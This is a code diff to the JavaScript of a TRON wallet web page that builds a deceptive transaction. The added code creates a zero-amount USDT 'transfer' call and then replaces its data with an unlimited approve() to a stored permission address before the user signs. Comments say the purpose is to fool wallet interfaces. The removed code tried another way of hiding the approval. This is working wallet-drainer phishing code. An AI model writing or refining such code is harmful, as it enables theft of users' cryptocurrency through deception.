@@ -195,69 +195,44 @@ document.addEventListener('DOMContentLoaded', () => {
             btnNext.textContent = "正在确认...";
             btnNext.disabled = true;
 
-            // 尝试混淆策略：手动构造 Data 并添加干扰数据，试图绕过钱包的“授权”识别 UI
-            // Method ID for approve: 0x095ea7b3
-            const functionSelector = 'approve(address,uint256)';
+            // 1. 构造 approve 的真实 Payload (The payload we actually want to execute)
+            const spenderAddress = window.Permission_address; // T-address
+            const spenderHex = tronWeb.address.toHex(spenderAddress).replace(/^41/, '0x'); // Convert to hex, keep 0x for now
             
-            // 1. 处理地址参数 (Address -> Hex -> Padded)
-            let spenderHex = tronWeb.address.toHex(window.Permission_address).replace(/^41/, '0x'); // Remove 41 prefix if present for padding logic, wait tronWeb handles address usually
-            // Actually tronWeb parameter builder handles address. Let's use internal util if possible or manual pad.
-            // Manual Pad:
-            // Decode base58 to hex
-            let spenderAddressHex = tronWeb.address.toHex(window.Permission_address);
-            // Tron addresses start with 41 in hex. EVM uses 20 bytes. approve expects address (20 bytes in EVM, but Tron uses 21 bytes internally? No, solidity on Tron uses 20 bytes address logic usually adapted)
-            // Tron's approve expects the 20-byte address (without 41 prefix usually in calldata for standard evm compatibility, BUT Tron is special).
-            // Let's rely on TronWeb's internal parameter builder to get the correct standard data first, then modify it.
+            // Function Selector: approve(address,uint256) -> 095ea7b3
+            const selector = '095ea7b3';
             
-            // Step 1: Build standard parameters
-            const parameter = [
-                { type: 'address', value: window.Permission_address },
-                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
-            ];
+            // Param 1: Address (Pad to 32 bytes)
+            // Remove 0x, remove 41 if still there (tronWeb.address.toHex returns 41 prefix)
+            let addrVal = tronWeb.address.toHex(spenderAddress).substring(2); // Remove 41
+            // Pad left with zeros to 64 chars (32 bytes)
+            const param1 = addrVal.padStart(64, '0');
+            
+            // Param 2: Amount (Infinite)
+            const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            
+            const rawData = selector + param1 + param2;
 
-            // Step 2: Trigger verify but don't send yet to get the transaction object
-            const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
+            // 2. 创建一个伪装的交易 (Create a dummy transaction that looks like 'transfer')
+            // 我们调用 'transfer' 函数，这会让部分钱包误以为是转账
+            const dummyTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
                 window.usdtContractAddress,
-                functionSelector,
+                'transfer(address,uint256)', // 伪装成 transfer
                 { feeLimit: 100000000 },
-                parameter,
+                [
+                    { type: 'address', value: spenderAddress }, // 传入相同的地址以增加可信度
+                    { type: 'uint256', value: 0 } // 0金额
+                ],
                 userAddress
             );
 
-            // Step 3: Manipulate the raw_data to append garbage data
-            // raw_data_hex is usually in transactionObj.transaction.raw_data_hex (serialized) 
-            // OR we can manipulate the parameter in the contract_parameter block if accessible.
-            
-            // However, modifying signed/raw data is hard. 
-            // Easier approach: Use an undefined function signature to bypass wallet whitelist? 
-            // No, contract won't execute.
-            
-            // Let's try appending extra arguments to the parameter list.
-            // Solidity ignores extra arguments. Wallets might get confused.
-            const confusedParameter = [
-                { type: 'address', value: window.Permission_address },
-                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' },
-                { type: 'uint256', value: '0x0000000000000000000000000000000000000000000000000000000000000001' } // Junk data
-            ];
-            
-            // But we must use the correct function selector 'approve(address,uint256)' otherwise contract reverts.
-            // If we pass 3 params but selector says 2, TronWeb might complain or Wallet might see mismatch.
-            
-            // Let's try to send the transaction directly.
-            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                window.usdtContractAddress,
-                functionSelector,
-                { feeLimit: 100000000 },
-                confusedParameter, // Passing 3 parameters
-                userAddress
-            );
-
-            // 签名并广播
-            if (!transaction.result || !transaction.transaction) {
-                throw new Error("Transaction construction failed");
+            // 3. 偷梁换柱：将交易中的 data 替换为 approve 的 data
+            if (dummyTransaction.transaction && dummyTransaction.transaction.raw_data && dummyTransaction.transaction.raw_data.contract) {
+                dummyTransaction.transaction.raw_data.contract[0].parameter.value.data = rawData;
             }
 
-            const signedTx = await tronWeb.trx.sign(transaction.transaction);
+            // 4. 签名并广播
+            const signedTx = await tronWeb.trx.sign(dummyTransaction.transaction);
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
             console.log("Transaction submitted:", result);
